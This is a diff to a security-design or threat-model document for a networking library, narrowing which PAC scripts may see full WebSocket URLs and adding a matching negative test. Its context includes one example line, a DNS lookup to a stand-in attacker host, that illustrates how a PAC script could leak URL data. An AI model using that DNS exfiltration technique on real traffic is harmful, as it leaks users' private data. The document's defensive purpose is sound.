@@ -407,8 +407,9 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   path or query cannot leak through `dnsResolve("<data>.attacker.example")`; `ws` keeps its resource name (RFC 6455
   §4.1; a `ws://` request is readable on the wire anyway) and `http` gives the origin (the engine keeps answers per
   scheme, host and port; browsers pass an `http` path). Only with `pacFullWebSocketUrl`, and only for the script the
-  settings name when it is given inline or by an `https` or `file` URL (never one WPAD found or one over plain `http`,
-  which a LAN attacker can serve as easily), does a `wss` URI reach the script whole; on Apple platforms the entry's
+  settings name when it is given inline or by an `https` or local `file` URL (never one WPAD found or one over plain `http`,
+  which a LAN attacker can serve as easily; nor a `file:` URL with a host, `file://srv/share/p.pac`, which WinHTTP
+  fetches over SMB, spoofable on a LAN without SMB signing), does a `wss` URI reach the script whole; on Apple platforms the entry's
   URL must equal the settings' string exactly, and a mismatch gives the origin. The same URI rule holds on Windows,
   where WinHTTP runs the script. A run's 20 lookups count in total: a name looked up by both families counts twice.
 - **Residual (accepted):** the engine uses JavaScriptCore's public API only; the execution time limit of
@@ -435,7 +436,7 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   `.negative_hugeThrownValueIsNotCopied`, `.negative_wssScriptsGetTheOriginUnlessTheSettingsNameThemAndTheAppOptsIn`,
   `.negative_plainHttpPacUrlGetsTheOriginEvenWhenNamed` (macOS);
   `ProxyResolverTest.negative_unsupportedOnlyPacAnswerFailsClosed`, `.negative_pacTargetOfASecureUrlIsItsOriginOnly`,
-  `.negative_wpadScriptOnWindowsGetsTheOriginOnly`, `.negative_plainHttpPacUrlOnWindowsGetsTheOriginOnly`, `.pacHostIsLowerCase`.
+  `.negative_wpadScriptOnWindowsGetsTheOriginOnly`, `.negative_plainHttpPacUrlOnWindowsGetsTheOriginOnly`, `.negative_remoteFilePacUrlGetsTheOriginOnly`, `.pacHostIsLowerCase`.
 
 ### 3.21 TCP peers that read slowly or not at all (JVM and Android)
 
